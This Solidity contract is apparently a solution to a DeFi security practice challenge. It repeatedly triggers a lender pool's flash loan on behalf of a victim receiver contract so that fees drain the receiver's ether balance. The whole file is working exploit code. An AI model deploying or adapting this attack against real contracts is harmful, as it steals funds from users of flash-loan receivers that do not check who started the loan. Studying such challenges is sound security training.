pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

interface IFlashLoanReceiver {
    function receiveEther(uint256 fee) external payable;
}

interface INaiveReceiverLenderPool {
    function flashLoan(address payable borrower, uint256 borrowAmount) external;
}

contract HackNaiveReceiver {
    using SafeMath for uint256;
    using Address for address payable;

    event PrintUint256(uint256);

    function hack(address _pool, address _receiver) public payable {
        INaiveReceiverLenderPool pool = INaiveReceiverLenderPool(_pool);
        uint256 poolBalBefore = address(pool).balance;
        uint256 receiverNumEth = address(_receiver).balance / 1 ether;

        for (uint256 i = 0; i < receiverNumEth; i++) {
            pool.flashLoan(payable(_receiver), 0.1 ether);
        }

        emit PrintUint256(address(_receiver).balance);
        emit PrintUint256(receiverNumEth);
        require(
            address(pool).balance - poolBalBefore == receiverNumEth * 1 ether,
            "pool has receivers funds"
        );
        require(
            address(_receiver).balance == 0 ether,
            "receiver wallet drained"
        );
    }
}
